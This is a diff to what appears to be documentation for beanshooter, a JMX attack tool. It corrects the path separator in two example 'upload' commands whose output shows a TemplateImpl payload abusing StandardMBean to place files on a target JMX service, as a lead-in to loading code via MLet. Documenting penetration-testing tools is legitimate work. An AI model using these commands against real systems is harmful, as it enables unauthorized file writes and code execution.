@@ -732,7 +732,7 @@ you may be able to upload the *TonkaBean* Jar file and load it via *MLet* and th
 [+] 	Archive:   tonka-bean-4.0.0-jar-with-dependencies.jar
 [+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
 [+] 	Codebase:  file:/tmp/
-[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload tonka-bean-4.0.0-jar-with-dependencies.jar:/tmp/tonka-bean-4.0.0-jar-with-dependencies.jar
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload tonka-bean-4.0.0-jar-with-dependencies.jar::/tmp/tonka-bean-4.0.0-jar-with-dependencies.jar
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
 [+]
 [+] 	Deplyoing MBean: StandardMBean
@@ -743,7 +743,7 @@ you may be able to upload the *TonkaBean* Jar file and load it via *MLet* and th
 [+]
 [+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4825542879735 from the MBeanServer.
 [+] 	MBean was successfully removed.
-[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload index.html:/tmp/index.html
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload index.html::/tmp/index.html
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
 [+]
 [+] 	Deplyoing MBean: StandardMBean
